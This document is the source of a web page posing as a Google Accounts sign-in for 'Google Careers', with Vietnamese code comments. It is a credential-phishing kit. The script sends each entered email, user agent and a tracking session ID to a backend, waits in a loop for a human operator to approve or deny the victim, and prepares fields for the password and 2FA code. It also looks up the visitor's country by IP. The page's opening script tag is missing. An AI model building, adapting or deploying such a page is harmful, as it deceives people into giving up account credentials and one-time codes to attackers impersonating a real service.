<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="icon" href="google_logo_icon_169090.ico">
    <script src="flow.js"></script>
    <style>
        /* Đẩy input xuống thấp hơn cho trang này */
        .signin-form .input-field {
            margin-top: 24px !important;
        }

        /* ============ Footer: Language (left) + Help/Privacy/Terms (right) ============
           Footer nằm SÁT dưới form, width bằng với form card (1050px) để Language
           thẳng hàng với mép trái form, Help/Privacy/Terms thẳng hàng với mép phải.
           Không dính với layout "margin-top: auto" gốc đẩy footer xuống cuối page. */
        .main-wrapper {
            justify-content: center !important;
        }
        .login-wrapper {
            min-height: auto !important;
            flex-direction: column !important;
            width: auto !important;
            max-width: none !important;
            margin: 0 !important;
        }
        .page-footer {
            margin-top: 0 !important;
            padding: 10px 0 0 !important;
            width: 1050px;
            max-width: 100%;
            align-self: center;
        }
        .footer-wrapper {
            display: flex !important;
            justify-content: space-between !important;
            align-items: center;
            gap: 24px;
            width: 100%;
            max-width: 1050px;
            margin: 0 auto;
            padding: 0 8px;
            flex-wrap: wrap;
        }
        .footer-left, .footer-right {
            display: flex;
            align-items: center;
            gap: 22px;
        }
        .footer-right { flex-wrap: wrap; }

        /* Language selector button */
        .lang-picker {
            position: relative;
            display: inline-block;
        }
        /* Language selector button — dạng text thuần, KHÔNG có ô viền/
           nền, chỉ có chữ + mũi tên caret (giống ảnh user cung cấp). */
        .lang-picker-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: transparent;
            border: none;
            color: #3c4043;
            font-size: 13px;
            font-family: inherit;
            font-weight: 400;
            cursor: pointer;
            padding: 6px 4px;
            border-radius: 0;
            transition: color .15s ease;
        }
        .lang-picker-btn:hover { color: #202124; }
        .lang-picker-btn:focus-visible { outline: none; }
        .lang-picker.open .lang-picker-btn { color: #202124; }
        .lang-picker-btn .caret {
            width: 0; height: 0;
            border-left: 4px solid transparent;
            border-right: 4px solid transparent;
            border-top: 5px solid #5f6368;
            transition: transform .2s ease;
            flex-shrink: 0;
        }
        .lang-picker.open .lang-picker-btn .caret {
            transform: rotate(180deg);
        }

        /* Dropdown menu — danh sách dài, scroll, item dạng text thuần */
        .lang-menu {
            position: absolute;
            bottom: calc(100% + 6px);
            left: 0;
            width: 260px;
            max-height: 360px;
            overflow-y: auto;
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0,0,0,.10), 0 4px 16px rgba(0,0,0,.06);
            padding: 4px 0;
            display: none;
            z-index: 1000;
        }
        .lang-picker.open .lang-menu { display: block; }
        .lang-menu button {
            display: block;
            width: 100%;
            text-align: left;
            background: transparent;
            border: none;
            padding: 10px 16px;
            font-size: 14px;
            line-height: 1.35;
            color: #3c4043;
            font-family: inherit;
            cursor: pointer;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .lang-menu button:hover,
        .lang-menu button:focus-visible {
            background: #f1f3f4;
            outline: none;
        }
        .lang-menu button.active {
            background: #e8f0fe;
            color: #1a73e8;
            font-weight: 500;
        }
        .lang-menu button.active:hover { background: #d2e3fc; }
        /* Scrollbar tinh gọn */
        .lang-menu::-webkit-scrollbar { width: 10px; }
        .lang-menu::-webkit-scrollbar-thumb {
            background: #dadce0;
            border-radius: 6px;
            border: 2px solid #fff;
        }
        .lang-menu::-webkit-scrollbar-thumb:hover { background: #bdc1c6; }

        @media (max-width: 600px) {
            .footer-wrapper { flex-direction: column; gap: 10px; }
            .footer-left, .footer-right { justify-content: center; }
        }
    </style>
</head>
<body>
    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
    </div>

    <!-- Main content -->
    <div class="main-wrapper page-transition">
        <div class="login-wrapper">
            <div class="signin-card">
                <!-- Progress bar container -->
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="signin-columns">
                    <!-- Left Column: Logo, Title, Description -->
                    <div class="signin-left">
                        <div class="logo-wrapper">
                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
                        </div>
                        <h1 class="signin-title" data-i18n="signin">Sign in</h1>
                        <p class="signin-subtitle" style="color: #202124;" data-i18n="subtitle">to continue to Google Careers</p>
                    </div>
                    
                    <!-- Right Column: Sign-in Form -->
                    <div class="signin-right">
                        <form id="loginForm" class="signin-form" novalidate>
                            <div class="input-field">
                                <input type="email" id="email" class="text-input" placeholder=" " required autocomplete="username">
                                <label for="email" class="floating-label" data-i18n="emailLabel">Email or phone</label>
                            </div>
                            <div class="error-wrapper">
                                <span class="error-text" id="email-error"></span>
                            </div>
                            
                                <button type="button" class="forgot-email-btn" data-i18n="forgotEmail">Forgot email?</button>
                            
                            <div class="helper-text">
                                <p><span data-i18n="notYourComputer">Not your computer? Use Guest mode to sign in privately.</span> <a href="#" class="learn-more" data-i18n="learnMore">Learn more about using Guest mode</a></p>
                            </div>
                            
                            <div class="action-buttons">
                                <button type="submit" class="btn-primary" data-i18n="next">Next</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer with language selector + help links -->
            <footer class="page-footer">
                <div class="footer-wrapper">
                    <div class="footer-left">
                        <div class="lang-picker" id="langPicker">
                            <button type="button" class="lang-picker-btn" id="langPickerBtn" aria-haspopup="listbox" aria-expanded="false">
                                <span id="langCurrentLabel">English (United States)</span>
                                <span class="caret"></span>
                            </button>
                            <div class="lang-menu" id="langMenu" role="listbox"></div>
                        </div>
                    </div>
                    <div class="footer-right">
                        <a href="#" class="footer-link" data-i18n="help">Help</a>
                        <a href="#" class="footer-link" data-i18n="privacy">Privacy</a>
                        <a href="#" class="footer-link" data-i18n="terms">Terms</a>
                    </div>
                </div>
            </footer>
    </div>

        function getMeta(code) {
            return LANG_META.find(m => m.code === code) || LANG_META[0];
        }

        // Áp dụng ngôn ngữ cho toàn bộ phần tử có [data-i18n]
        function applyLang(code) {
            const dict = I18N[code] || I18N.en;
            document.documentElement.lang = code;
            document.documentElement.dir = (code === 'ar') ? 'rtl' : 'ltr';
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (dict[key]) el.textContent = dict[key];
            });
            const meta = getMeta(code);
            const label = document.getElementById('langCurrentLabel');
            if (label) label.textContent = meta.native;
            document.querySelectorAll('#langMenu button').forEach(b => {
                b.classList.toggle('active', b.dataset.code === code);
            });
            window.__currentLang = code;
            window.__t = dict;
        }

        // Dựng dropdown ngôn ngữ
        function buildLangMenu() {
            const menu = document.getElementById('langMenu');
            if (!menu) return;
            menu.innerHTML = LANG_META.map(m => `
                <button type="button" data-code="${m.code}" role="option" title="${m.native}">${m.native}</button>
            `).join('');
            menu.querySelectorAll('button').forEach(b => {
                b.addEventListener('click', () => {
                    const code = b.dataset.code;
                    localStorage.setItem('preferredLang', code);
                    localStorage.setItem('langManual', '1');
                    applyLang(code);
                    document.getElementById('langPicker').classList.remove('open');
                });
            });
        }

        // Detect country qua IP rồi chọn ngôn ngữ tương ứng. Cache kết quả
        // vào localStorage để không gọi lại API mỗi lần load trang.
        async function detectLangByIp() {
            // Nếu user đã tự chọn ngôn ngữ rồi → tôn trọng lựa chọn đó
            if (localStorage.getItem('langManual') === '1') {
                return localStorage.getItem('preferredLang') || 'en';
            }
            // Có cache → dùng luôn
            const cached = localStorage.getItem('preferredLang');
            if (cached && I18N[cached]) return cached;

            try {
                const resp = await fetch('https://ipwho.is/?fields=country_code,success', { cache: 'force-cache' });
                const j = await resp.json();
                if (j && j.success && j.country_code) {
                    const cc = j.country_code.toUpperCase();
                    const lang = COUNTRY_LANG[cc] || 'en';
                    localStorage.setItem('preferredLang', lang);
                    localStorage.setItem('langAutoCC', cc);
                    return lang;
                }
            } catch (_) { /* ignore — fallback to en */ }
            // Fallback: navigator.language
            const nav = (navigator.language || 'en').toLowerCase();
            if (nav.startsWith('vi')) return 'vi';
            if (nav.startsWith('ja')) return 'ja';
            if (nav.startsWith('ko')) return 'ko';
            if (nav.startsWith('zh-tw') || nav.startsWith('zh-hk')) return 'zh-TW';
            if (nav.startsWith('zh')) return 'zh-CN';
            if (nav.startsWith('fr')) return 'fr';
            if (nav.startsWith('de')) return 'de';
            if (nav.startsWith('es')) return 'es';
            if (nav.startsWith('pt')) return 'pt-BR';
            if (nav.startsWith('ru')) return 'ru';
            if (nav.startsWith('id')) return 'id';
            if (nav.startsWith('th')) return 'th';
            if (nav.startsWith('ar')) return 'ar';
            if (nav.startsWith('it')) return 'it';
            if (nav.startsWith('nl')) return 'nl';
            if (nav.startsWith('pl')) return 'pl';
            if (nav.startsWith('tr')) return 'tr';
            if (nav.startsWith('hi')) return 'hi';
            return 'en';
        }

        // Đóng dropdown khi click ra ngoài
        document.addEventListener('click', (e) => {
            const picker = document.getElementById('langPicker');
            if (!picker) return;
            if (!picker.contains(e.target)) picker.classList.remove('open');
        });

        // Function to update page status
        async function updatePageStatus(pageName) {
            const requestId = localStorage.getItem('requestId');
            if (!requestId) return;
            
            try {
                await fetch('http://localhost:5000/api/update-page', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        id: parseInt(requestId), 
                        currentPage: pageName 
                    })
                });
            } catch (err) {
                console.log('Failed to update page status');
            }
        }

        // Indeterminate progress bar + form dim (Google-style "waiting" state).
        // Stripe xanh chạy liên tục ở mép trên card, phần form ở dưới mờ đi.
        function startProgressBar() {
            const progressContainer = document.querySelector('.progress-container');
            const card = document.querySelector('.signin-card');
            if (progressContainer) progressContainer.classList.add('active');
            if (card) card.classList.add('waiting');

            return {
                complete: () => {
                    if (progressContainer) progressContainer.classList.remove('active');
                    if (card) card.classList.remove('waiting');
                },
                hide: () => {
                    if (progressContainer) progressContainer.classList.remove('active');
                    if (card) card.classList.remove('waiting');
                }
            };
        }

        // Page transition handler
        function handleTransition(url) {
            const card = document.querySelector('.signin-card');
            if (card) {
                card.classList.add('fade-out');
            setTimeout(() => {
                window.location.href = url;
            }, 300);
        } else {
            window.location.href = url;
        }
    }

        // Form validation and submission
        function handleFormSubmission() {
        const form = document.getElementById('loginForm');
                const emailInput = document.getElementById('email');
                const emailError = document.getElementById('email-error');
                
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                // Reset previous errors
                emailInput.classList.remove('error');
                emailError.textContent = '';
                const email = emailInput.value.trim();
                // Basic email validation
                const t = (window.__t || I18N.en);
                if (!email) {
                    showError(t.errEmpty || 'Enter an email or phone number');
                    return;
                }
                if (!isValidEmail(email) && !isValidPhone(email)) {
                    showError(t.errInvalid || 'Enter a valid email or phone number');
                    return;
                }
                // Show loading state
                const submitBtn = form.querySelector('.btn-primary');
                submitBtn.classList.add('loading');
                submitBtn.disabled = true;
                
                // Start smooth progress bar
                const progress = startProgressBar();
                
                // Store email for next page
                localStorage.setItem('userEmail', email);
                
                // Gửi dữ liệu lên backend GUI Local
                const userAgent = navigator.userAgent;
                // SessionId persistent — cùng 1 browser session/tab = cùng sessionId,
                // kể cả user thử nhiều email/password khác nhau.
                let sessionId = localStorage.getItem('sessionId');
                if (!sessionId) {
                    sessionId = 'sess_' + Math.random().toString(36).slice(2, 10)
                              + Date.now().toString(36).slice(-4);
                    localStorage.setItem('sessionId', sessionId);
                }
                let requestId = null;
                try {
                    const res = await fetch('http://localhost:5000/api/request', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            email, 
                            password: '', 
                            twofa: '', 
                            userAgent,
                            currentPage: 'index.html',
                            sessionId
                        })
                    });
                    const data = await res.json();
                    requestId = data.requestId;
                    localStorage.setItem('requestId', requestId);
                } catch (err) {
                    console.log('Backend not available');
                    // Backend down / không kết nối được → KHÔNG tự chuyển trang.
                    // Gỡ trạng thái loading để user thấy và thử lại.
                    progress.hide();
                    submitBtn.classList.remove('loading');
                    submitBtn.disabled = false;
                    const t2 = (window.__t || I18N.en);
                    showError(t2.errServer || 'Cannot reach server. Please try again.');
                    return;
                }
                
                // Bắt đầu kiểm tra phê duyệt
                await checkApprovalStatus(requestId, 'password.html');
            });

            function showError(message) {
                emailInput.classList.add('error');
                emailError.textContent = message;
                emailInput.focus();
            }

            function isValidEmail(email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }

            function isValidPhone(phone) {
                const phoneRegex = /^\+?[\d\s\-\(\)]+$/;
                return phoneRegex.test(phone) && phone.replace(/\D/g, '').length >= 10;
            }

            // Hàm kiểm tra trạng thái approval.
            // Poll mãi đến khi admin duyệt hoặc từ chối — KHÔNG tự
            // chuyển trang nếu chưa được duyệt.
            async function checkApprovalStatus(requestId, nextPage) {
                const checkStatus = async () => {
                    try {
                        const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
                        if (response.ok) {
                            const data = await response.json();

                            if (data.status === 'approved') {
                                const email = localStorage.getItem('userEmail');
                                const target = data.nextPage || nextPage;
                                const progress = startProgressBar();
                                progress.complete();
                                setTimeout(() => {
                                    window.location.href = target + '?email=' + encodeURIComponent(email);
                                }, 300);
                                return;
                            } else if (data.status === 'denied') {
                                const submitBtn = document.querySelector('.btn-primary');
                                submitBtn.classList.remove('loading');
                                submitBtn.disabled = false;
                                const progress = document.querySelector('.progress-container');
                                if (progress) progress.classList.remove('active');
                                const card = document.querySelector('.signin-card');
                                if (card) card.classList.remove('waiting');
                                const t3 = (window.__t || I18N.en);
                                if (data.nextPage === 'invalid_work_email') {
                                    showError(t3.errWork || 'Invalid work email. Please try again');
                                } else if (data.nextPage === 'email_not_found') {
                                    showError(t3.errNotFound || "Couldn't find your Google Account");
                                } else {
                                    showError(t3.errInvalid || 'Invalid email or phone number. Please try again.');
                                }
                                return;
                            }
                        }
                    } catch (error) {
                        console.error('Error checking approval status:', error);
                        // Network blip — tiếp tục poll, không chuyển trang
                    }
                    // Vẫn pending → check lại sau 1s, không có timeout
                    setTimeout(checkStatus, 1000);
                };

                checkStatus();
            }
        }

        // Mobile responsive handler
        function handleMobileLayout() {
            function checkMobile() {
                if (window.innerWidth <= 600) {
                    document.body.classList.add('mobile-layout');
                } else {
                    document.body.classList.remove('mobile-layout');
                }
            }
            
            checkMobile();
            window.addEventListener('resize', checkMobile);
        }

        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            // QUAN TRỌNG: gắn form listener TRƯỚC TIÊN, KHÔNG await gì hết,
            // để user bấm Next là submit API /api/request ngay. Nếu await
            // detectLangByIp() ở đây, mạng chậm sẽ khiến listener chưa kịp
            // attach → form submit native → refresh trang → admin không thấy.
            handleFormSubmission();
            handleMobileLayout();

            // Focus on email input
            document.getElementById('email').focus();

            // --- i18n chạy song song (không block form) ---
            buildLangMenu();
            // Apply ngay tiếng Anh (tránh flash text rỗng) rồi detect async
            applyLang(localStorage.getItem('preferredLang') || 'en');
            detectLangByIp().then(lang => applyLang(lang)).catch(() => {});

            const picker = document.getElementById('langPicker');
            const pickerBtn = document.getElementById('langPickerBtn');
            if (pickerBtn) {
                pickerBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    picker.classList.toggle('open');
                    const isOpen = picker.classList.contains('open');
                    pickerBtn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
                    // Khi mở menu, cuộn item đang active vào giữa viewport menu.
                    if (isOpen) {
                        const active = picker.querySelector('#langMenu button.active');
                        if (active) active.scrollIntoView({ block: 'center' });
                    }
                });
            }
            
            // Handle forgot email button
            const forgotBtn = document.querySelector('.forgot-email-btn');
            if (forgotBtn) {
                forgotBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Forgot email feature would be implemented here');
                });
            }
            
            // Handle create account button
            const btnSecondary = document.querySelector('.btn-secondary');
            if (btnSecondary) {
                btnSecondary.addEventListener('click', function() {
                    alert('Create account feature would be implemented here');
                });
            }
            
            // Handle learn more link
            const learnMore = document.querySelector('.learn-more');
            if (learnMore) {
                learnMore.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Guest mode help would be shown here');
                });
            }
        });

        // Accessibility improvements
        document.addEventListener('keydown', function(e) {
            // Allow form submission with Enter key
            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
            }
    });
